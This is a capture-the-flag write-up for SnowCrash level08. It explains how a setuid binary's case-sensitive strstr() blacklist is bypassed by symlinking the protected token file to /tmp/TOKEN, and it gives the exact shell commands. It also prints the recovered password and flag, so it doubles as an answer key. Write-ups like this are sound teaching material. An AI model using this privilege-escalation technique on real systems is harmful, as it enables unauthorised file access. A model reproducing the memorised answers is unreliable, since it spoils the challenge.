# Level08 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Bypass a case-sensitive blacklist using symlinks to retrieve the flag08 token.

## Vulnerability
Case-sensitive `strstr()` blacklist check that only blocks lowercase "token" string.

## Binary Analysis
The setuid binary implements a blacklist to prevent reading certain files:

```c
if (strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
}
```

## The Problem

1. **Case-Sensitive Check**: `strstr()` is case-sensitive
2. **Incomplete Blacklist**: Only checks for lowercase "token"
3. **No Path Normalization**: Doesn't follow symlinks to check target
4. **File Protection**: Protected token file is readable by setuid binary

## Exploitation

### Method 1: Symlink with Uppercase Name
```bash
ln -s /home/user/level08/token /tmp/TOKEN
/home/user/level08/level08 /tmp/TOKEN
```

The binary checks `/tmp/TOKEN` (no lowercase "token"), passes the check, opens the file, and reads it via the symlink.

### Method 2: Direct uppercase path (if accessible)
```bash
/home/user/level08/level08 TOKEN
```

Would work if TOKEN exists in current directory.

## Result
The symlink bypass reveals the token file containing: `quif5eloekouj29ke0vouxean`
This is the password to access the flag08 account.

Running `getflag` as flag08 produces: `25749xKZ8L7DkSCwJkT9dyv6f`

## Security Flaws

1. **Case-Sensitive Comparison**: Only blocks lowercase "token"
2. **Inadequate Blacklist**: Single string check easily bypassed
3. **No Symlink Following**: Doesn't follow symlinks before check
4. **Setuid Privilege**: Binary runs with flag08 privileges


## Answer

**Flag08 Password**: `quif5eloekouj29ke0vouxean` (from token file)
**Level08 Flag**: `25749xKZ8L7DkSCwJkT9dyv6f` (from getflag as flag08)
**Vulnerability**: Case-sensitive blacklist bypass via symlink
**Impact**: Read protected files using case variation and symlinks
